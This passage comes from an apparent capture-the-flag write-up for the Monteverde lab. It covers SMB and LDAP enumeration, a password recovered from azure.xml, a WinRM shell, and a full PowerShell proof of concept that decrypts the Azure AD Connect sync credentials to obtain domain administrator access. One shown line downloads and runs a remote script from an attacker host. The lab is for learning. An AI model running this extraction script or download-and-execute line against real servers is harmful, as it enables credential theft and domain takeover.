+</span></span><span style="display:flex;"><span>LDAP        10.129.228.111  <span style="color:#ae81ff">389</span>    MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK.LOCAL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.228.111  <span style="color:#ae81ff">389</span>    MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\S</span>ABatchJobs:SABatchJobs 
+</span></span></code></pre></div><p><strong>Observations:</strong></p>
+<ul>
+<li><code>SABatchJobs</code> can authenticate to LDAP, but further LDAP enumeration did not reveal immediately exploitable data.</li>
+</ul>
+<h4 id="bloodhound-data-collection">BloodHound Data Collection</h4>
+<p>Ran a BloodHound collection to gather AD relationships and permissions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 03:27:26 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># nxc ldap megabank.local -u SABatchJobs -p SABatchJobs --bloodhound -c all --dns-server 10.129.228.111</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.228.111  <span style="color:#ae81ff">389</span>    MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK.LOCAL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.228.111  <span style="color:#ae81ff">389</span>    MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MEGABANK.LOCAL<span style="color:#ae81ff">\S</span>ABatchJobs:SABatchJobs 
+</span></span><span style="display:flex;"><span>LDAP        10.129.228.111  <span style="color:#ae81ff">389</span>    MONTEVERDE       Resolved collection methods: trusts, rdp, objectprops, container, psremote, session, dcom, group, acl, localadmin
+</span></span><span style="display:flex;"><span>LDAP        10.129.228.111  <span style="color:#ae81ff">389</span>    MONTEVERDE       Done in 00M 20S
+</span></span><span style="display:flex;"><span>LDAP        10.129.228.111  <span style="color:#ae81ff">389</span>    MONTEVERDE       Compressing output into /root/.nxc/logs/MONTEVERDE_10.129.228.111_2025-06-03_033404_bloodhound.zip
+</span></span></code></pre></div><p><strong>Observations:</strong></p>
+<ul>
+<li>BloodHound data was collected but did not reveal an immediate escalation path for <code>SABatchJobs</code>.</li>
+</ul>
+<h3 id="smb-share-content-enumeration">SMB Share Content Enumeration</h3>
+<p>Since <code>SABatchJobs</code> had read access to the “azure_uploads” and “users$” shares, these shares were examined for sensitive files.</p>
+<h5 id="azure_uploads-share"><code>azure_uploads</code> Share</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 03:41:18 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># smbclient  //megabank.local/azure_uploads -U &#34;SABatchJobs%SABatchJobs&#34;</span>
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 12:43:06 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 12:43:06 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">31999</span> blocks of size 4096. <span style="color:#ae81ff">28979</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span>
+</span></span></code></pre></div><p><strong>Result:</strong> No files inside the “azure_uploads” directory.</p>
+<h5 id="users-share"><code>users$</code> Share</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 03:42:34 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># smbclient  //megabank.local/users$ -U &#34;SABatchJobs%SABatchJobs&#34;</span>
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:12:48 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:12:48 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  dgalanos                            D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:12:30 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  mhope                               D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:41:18 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  roleary                             D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:10:30 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  smorgan                             D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:10:24 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">31999</span> blocks of size 4096. <span style="color:#ae81ff">28979</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls dgalanos<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:12:30 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:12:30 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">31999</span> blocks of size 4096. <span style="color:#ae81ff">28979</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls mhope<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:41:18 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:41:18 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  azure.xml                          AR     <span style="color:#ae81ff">1212</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:40:23 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">31999</span> blocks of size 4096. <span style="color:#ae81ff">28979</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls roleary<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:10:30 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:10:30 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">31999</span> blocks of size 4096. <span style="color:#ae81ff">28979</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls smorgan<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:10:24 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:10:24 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">31999</span> blocks of size 4096. <span style="color:#ae81ff">28979</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd mhope
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:41:18 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:41:18 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  azure.xml                          AR     <span style="color:#ae81ff">1212</span>  Fri Jan  <span style="color:#ae81ff">3</span> 13:40:23 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">31999</span> blocks of size 4096. <span style="color:#ae81ff">28979</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\&gt;</span> get azure.xml 
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\a</span>zure.xml of size <span style="color:#ae81ff">1212</span> as azure.xml <span style="color:#f92672">(</span>3.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 3.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\&gt;</span> 
+</span></span></code></pre></div><p><strong>Observations:</strong></p>
+<ul>
+<li>The only interesting file found was <code>azure.xml</code> inside the <code>mhope</code> directory.</li>
+<li>This file was downloaded locally for further analysis.</li>
+</ul>
+<h4 id="azurexml-file-analysis"><code>azure.xml</code> File Analysis</h4>
+<p>The contents of <code>azure.xml</code> revealed a stored password for the user <code>mhope</code>. This credential was used to obtain a low-privilege WinRM shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 03:45:51 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># cat azure.xml                                              </span>
+</span></span><span style="display:flex;"><span>��&lt;Objs Version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;Obj RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;TN RefId<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
+</span></span><span style="display:flex;"><span>      &lt;T&gt;System.Object&lt;/T&gt;
+</span></span><span style="display:flex;"><span>    &lt;/TN&gt;
+</span></span><span style="display:flex;"><span>    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;
+</span></span><span style="display:flex;"><span>    &lt;Props&gt;
+</span></span><span style="display:flex;"><span>      &lt;DT N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;StartDate&#34;</span>&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+</span></span><span style="display:flex;"><span>      &lt;DT N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;EndDate&#34;</span>&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;
+</span></span><span style="display:flex;"><span>      &lt;G N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;KeyId&#34;</span>&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;
+</span></span><span style="display:flex;"><span>      &lt;S N<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span>&gt;4n0therD4y@n0th3r$&lt;/S&gt;
+</span></span><span style="display:flex;"><span>    &lt;/Props&gt;
+</span></span><span style="display:flex;"><span>  &lt;/Obj&gt;
+</span></span><span style="display:flex;"><span>&lt;/Objs&gt;#
+</span></span></code></pre></div><p><strong>Decoded Credential:</strong></p>
+<ul>
+<li><strong>Username:</strong> <code>mhope</code></li>
+<li><strong>Password:</strong> <code>4n0therD4y@n0th3r$</code></li>
+</ul>
+<h3 id="winrm-shell-as-mhope">WinRM Shell as <code>mhope</code></h3>
+<p>Using the extracted credentials, a WinRM connection was established via Evil-WinRM to obtain a shell as the <code>mhope</code> user. The user flag was then captured from the Desktop.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>Jun 03, <span style="color:#ae81ff">2025</span> - 03:48:16 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)]</span> exegol-HTB Monteverde <span style="color:#75715e"># nxc winrm megabank.local -u mhope -p &#39;4n0therD4y@n0th3r$&#39;     </span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.228.111  <span style="color:#ae81ff">5985</span>   MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:MEGABANK.LOCAL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.228.111  <span style="color:#ae81ff">5985</span>   MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 
+</span></span></code></pre></div><p>(Via Evil-WinRM)</p>
+<p><img src="/static/Monteverde/user.jpg" alt="user access"></p>
+<p><strong>Observations:</strong></p>
+<ul>
+<li>Successfully obtained a low-privilege shell as <code>mhope</code>.</li>
+<li>Retrieved the user flag.</li>
+</ul>
+<h4 id="mhope-privilege-enumeration"><code>mhope</code> Privilege Enumeration</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\mhope\desktop&gt; net user mhope
+</span></span><span style="display:flex;"><span>User name                    mhope
+</span></span><span style="display:flex;"><span>Full Name                    Mike Hope
+</span></span><span style="display:flex;"><span>Comment
+</span></span><span style="display:flex;"><span>User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment
+</span></span><span style="display:flex;"><span>Country/region code          <span style="color:#ae81ff">000</span> (System <span style="color:#66d9ef">Default</span>)
+</span></span><span style="display:flex;"><span>Account active               Yes
+</span></span><span style="display:flex;"><span>Account expires              Never
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Password last set            <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">40</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">05</span> PM
+</span></span><span style="display:flex;"><span>Password expires             Never
+</span></span><span style="display:flex;"><span>Password changeable          <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">3</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">40</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">05</span> PM
+</span></span><span style="display:flex;"><span>Password required            Yes
+</span></span><span style="display:flex;"><span>User may change password     No
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Workstations allowed         All
+</span></span><span style="display:flex;"><span>Logon script
+</span></span><span style="display:flex;"><span>User profile
+</span></span><span style="display:flex;"><span>Home directory               \\monteverde\users$\mhope
+</span></span><span style="display:flex;"><span>Last logon                   <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">3</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">29</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span> AM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Logon hours allowed          All
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Local Group Memberships      *Remote Management Use
+</span></span><span style="display:flex;"><span>Global Group memberships     *Azure Admins         *Domain Users
+</span></span><span style="display:flex;"><span>The command completed successfully.
+</span></span></code></pre></div><p><strong>Observations:</strong></p>
+<ul>
+<li><code>mhope</code> is a member of the <strong>Azure Admins</strong> group, indicating potential access to Azure AD Connect functionality on this server.</li>
+</ul>
+<h4 id="azure-ad-sync-enumeration">Azure AD Sync Enumeration</h4>
+<p>Since <code>mhope</code> belongs to the <strong>Azure Admins</strong> group, Azure AD Connect/Synchronization services were likely present. We checked installed Azure-related programs and running services.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Program Files&gt; Get-ChildItem -Path . -Directory | Where-Object { $_.Name <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#39;*azure*&#39;</span> } or use ls *azure*
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Program Files
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----         <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">2020</span>   <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">51</span> PM                Microsoft Azure Active Directory Connect
+</span></span><span style="display:flex;"><span>d-----         <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">2020</span>   <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">37</span> PM                Microsoft Azure Active Directory Connect Upgrader
+</span></span><span style="display:flex;"><span>d-----         <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">2020</span>   <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">02</span> PM                Microsoft Azure AD Connect Health Sync Agent
+</span></span><span style="display:flex;"><span>d-----         <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">2020</span>   <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">53</span> PM                Microsoft Azure AD Sync
+</span></span></code></pre></div><p><strong>Observations:</strong></p>
+<ul>
+<li>Multiple Azure AD Connect folders exist, including <code>Microsoft Azure AD Sync</code>.</li>
+<li>Azure AD Sync relies on a local SQL database named <code>ADSync</code>.</li>
+</ul>
+<h5 id="verifying-adsync-database">Verifying ADSync Database</h5>
+<p>Verified that SQL Server and the ADSync database were present and running:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\temp&gt; sqlcmd -S <span style="color:#ae81ff">127.0</span>.0.1 -E -Q <span style="color:#e6db74">&#34;SELECT name FROM sys.databases&#34;</span>
+</span></span><span style="display:flex;"><span>name
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>master
+</span></span><span style="display:flex;"><span>tempdb
+</span></span><span style="display:flex;"><span>model
+</span></span><span style="display:flex;"><span>msdb
+</span></span><span style="display:flex;"><span>ADSync
+</span></span></code></pre></div><p><strong>Observations:</strong></p>
+<ul>
+<li>ADSync database is present, confirming Azure AD Sync is configured.</li>
+</ul>
+<h3 id="extracting-administrator-credentials-via-adsync">Extracting Administrator Credentials via ADSync</h3>
+<p>A known Proof-of-Concept (PoC) script was used to extract domain administrator credentials from the ADSync database. The default connection string had to be modified for a full TCP instance instead of LocalDB.</p>
+<h5 id="connection-string-adjustment">Connection String Adjustment</h5>
+<ul>
+<li><strong>Default (LocalDB):</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#e6db74">&#34;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&#34;</span>
+</span></span></code></pre></div><ul>
+<li><strong>Updated (TCP Instance):</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#e6db74">&#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True&#34;</span>
+</span></span></code></pre></div><h4 id="ad-connect-sync-credential-extract-poc">AD Connect Sync Credential Extract PoC</h4>
+<ul>
+<li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">AzureAD POC Article</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;AD Connect Sync Credential Extract POC (@_xpn_)</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList <span style="color:#e6db74">&#34;Server=127.0.0.1;Database=ADSync;Integrated Security=True&#34;</span>
+</span></span><span style="display:flex;"><span>$client.Open()
+</span></span><span style="display:flex;"><span>$cmd = $client.CreateCommand()
+</span></span><span style="display:flex;"><span>$cmd.CommandText = <span style="color:#e6db74">&#34;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&#34;</span>
+</span></span><span style="display:flex;"><span>$reader = $cmd.ExecuteReader()
+</span></span><span style="display:flex;"><span>$reader.Read() | Out-Null
+</span></span><span style="display:flex;"><span>$key_id = $reader.GetInt32(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>$instance_id = $reader.GetGuid(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>$entropy = $reader.GetGuid(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>$reader.Close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$cmd = $client.CreateCommand()
+</span></span><span style="display:flex;"><span>$cmd.CommandText = <span style="color:#e6db74">&#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>$reader = $cmd.ExecuteReader()
+</span></span><span style="display:flex;"><span>$reader.Read() | Out-Null
+</span></span><span style="display:flex;"><span>$config = $reader.GetString(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>$crypted = $reader.GetString(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>$reader.Close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add-type -path <span style="color:#e6db74">&#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#39;</span>
+</span></span><span style="display:flex;"><span>$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+</span></span><span style="display:flex;"><span>$km.LoadKeySet($entropy, $instance_id, $key_id)
+</span></span><span style="display:flex;"><span>$key = $null
+</span></span><span style="display:flex;"><span>$km.GetActiveCredentialKey([<span style="color:#66d9ef">ref</span>]$key)
+</span></span><span style="display:flex;"><span>$key2 = $null
+</span></span><span style="display:flex;"><span>$km.GetKey(<span style="color:#ae81ff">1</span>, [<span style="color:#66d9ef">ref</span>]$key2)
+</span></span><span style="display:flex;"><span>$decrypted = $null
+</span></span><span style="display:flex;"><span>$key2.DecryptBase64ToString($crypted, [<span style="color:#66d9ef">ref</span>]$decrypted)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$domain = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Domain&#39;</span>; Expression = {$_.node.InnerXML}}
+</span></span><span style="display:flex;"><span>$username = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-user&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Username&#39;</span>; Expression = {$_.node.InnerXML}}
+</span></span><span style="display:flex;"><span>$password = select-xml -Content $decrypted -XPath <span style="color:#e6db74">&#34;//attribute&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Password&#39;</span>; Expression = {$_.node.InnerText}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Domain: &#34;</span> + $domain.Domain)
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Username: &#34;</span> + $username.Username)
+</span></span><span style="display:flex;"><span>Write-Host (<span style="color:#e6db74">&#34;Password: &#34;</span> + $password.Password)
+</span></span></code></pre></div><h4 id="executing-the-poc-and-capturing-admin-credentials">Executing the PoC and Capturing Admin Credentials</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\mhope\Documents&gt; iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://10.10.14.175/poc.ps1&#39;</span>)
+</span></span><span style="display:flex;"><span>AD Connect Sync Credential Extract POC (@_xpn_)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Domain<span style="color:#960050;background-color:#1e0010">:</span> MEGABANK.LOCAL
+</span></span><span style="display:flex;"><span>Username<span style="color:#960050;background-color:#1e0010">:</span> administrator
+</span></span><span style="display:flex;"><span>Password<span style="color:#960050;background-color:#1e0010">:</span> d0m@in4dminyeah!
+</span></span></code></pre></div><p><strong>Result:</strong></p>
+<ul>
+<li>Extracted <strong>Administrator</strong> credentials:<br>
+<code>administrator : d0m@in4dminyeah!</code></li>
+</ul>
+<h4 id="administrator-access--root-flag">Administrator Access &amp; Root Flag</h4>
+<p>Using the extracted administrator credentials, a WinRM session was established as the domain administrator, and the root flag was retrieved from the Desktop.</p>
